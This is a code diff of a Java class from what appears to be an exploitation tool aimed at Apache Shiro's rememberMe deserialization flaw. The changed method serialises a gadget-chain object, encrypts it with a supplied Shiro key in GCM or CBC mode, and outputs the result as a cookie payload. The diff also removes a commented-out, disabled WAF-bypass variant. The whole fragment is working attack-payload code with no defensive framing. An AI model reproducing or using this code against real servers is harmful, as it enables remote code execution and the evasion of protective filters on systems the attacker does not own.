@@ -29,34 +29,22 @@ public class Shiro implements FramePayload {
 
     @Override
     public String sendpayload(Object chainObject, String shiroKeyWord, String key) throws Exception {
+        return sendpayload(chainObject, shiroKeyWord, key, AttackService.aesGcmCipherType);
+    }
+
+    public String sendpayload(Object chainObject, String shiroKeyWord, String key, int aesGcmType) throws Exception {
         byte[] serpayload = SerializableUtils.toByteArray(chainObject);
-        byte[] bkey = Base64.getDecoder().decode(key);
-        byte[] encryptpayload = null;
-//        byte[] encryptpayload;
-        if (AttackService.aesGcmCipherType == 1) {
-//            CipherService cipherService = new AesCipherService();
-//            ByteSource byteSource = cipherService.encrypt(serpayload, bkey);
-//            encryptpayload = byteSource.getBytes();
-//            GcmEncrypt gcmEncrypt = new GcmEncrypt();
+        if (aesGcmType == 1) {
             ShiroGCM shiroGCM = new ShiroGCM();
-            String byteSource = shiroGCM.encrypt(key,serpayload);
-//            String byteSource = gcmEncrypt.encrypt(key, serpayload);
-//            encryptpayload = byteSource.getBytes();
+            String byteSource = shiroGCM.encrypt(key, serpayload);
             System.out.println(shiroKeyWord + "=" + byteSource);
             return shiroKeyWord + "=" + byteSource;
-
         } else {
-//            encryptpayload = AesUtil.encrypt(serpayload, bkey);
             CbcEncrypt cbcEncrypt = new CbcEncrypt();
             String byteSource = cbcEncrypt.encrypt(key, serpayload);
             System.out.println(shiroKeyWord + "=" + byteSource);
             return shiroKeyWord + "=" + byteSource;
         }
-
-//增加绕waf的方法，暂不开启。by @by3 @liuwa
-        //return shiroKeyWord +  "=" +"...." + DatatypeConverter.printBase64Binary(encryptpayload);
-//		return shiroKeyWord + "=" + DatatypeConverter.printBase64Binary(encryptpayload);
-
     }
 //    @Override
 //    public String sendpayload(Object chainObject, String shiroKeyWord, String key) throws Exception {
